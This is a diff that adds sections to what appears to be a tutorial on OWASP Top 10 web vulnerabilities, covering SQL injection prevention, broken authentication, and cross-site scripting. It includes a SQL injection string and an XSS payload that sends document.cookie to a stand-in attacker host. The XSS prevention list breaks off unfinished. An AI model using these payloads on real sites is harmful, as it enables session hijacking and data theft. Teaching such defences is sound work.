@@ -64,3 +64,77 @@ http://example.com/app/accountView?id=' or '1'='1
 This changes the meaning of both query to return all the records from the accounts table.
 
 **Preventive Measures **
+1. Keep untrusted data separate from commands and queries..
+2. Use a safe API which avoids the use of the interpreter entirely or provides a parameterized interface.
+3. If a parameterized API is not available, you should carefully escape special characters using the specific escape syntax for that interpreter.
+
+
+### **2. Broken Authentication and Session Management**
+
+
+![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/a6b69ff8-4d55-4d65-b775-ac987112de7a.png)
+
+
+Application functions related to authentication and session management are often not implemented correctly. This allows attackers to compromise passwords, keys, or session tokens.
+
+These kinds of flaws can be extremely serious in web applications and put businesses at a very high risk to not only lose confidential data but to open back doors to the entire company to maliscious attackers. 
+
+Exploitability | Prevalence | Detectability | Impact
+------------------- | -------------------- | ------------
+AVERAGE | WIDESPREAD   | AVERAGE |SEVERE
+
+**Example scenario** :  Session timeouts aren’t set properly. User uses a public computer to access site. Instead of selecting _“logout”_ the user simply closes the browser tab and walks away. Attacker can use the same browser an hour later, and that browser is still authenticated.
+
+**Preventive Measures **
+1. A single set of strong authentication and session management controls should be implemented.
+2. Strong efforts should also be made to avoid XSS flaws which can be used to steal session IDs.
+3. Proper application session timeout should be implemented.
+4. Consider the [ESAPI Authenticator and User APIs](http://owasp-esapi-java.googlecode.com/svn/trunk_doc/latest/org/owasp/esapi/Authenticator.html) as good examples.
+
+
+### **3. Cross-Site Scripting (XSS)**
+
+![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/cf94e0ae-5a50-4830-9d44-66ffe0cdcfff.png)
+
+
+Cross-site scripting flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.
+
+
+Exploitability | Prevalence | Detectability | Impact
+------------------- | -------------------- | ------------
+AVERAGE | VERY WIDESPREAD   | EASY | MODERATE
+
+**Example scenario** : The application uses untrusted data in the construction of the following HTML snippet without validation or escaping
+```
+(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
+```
+The attacker modifies the 'CC' parameter in their browser to:
+```
+'><script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi ?foo='+document.cookie</script>'.
+```
+This causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
+
+
+**Preventive Measures **
+
+1. 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
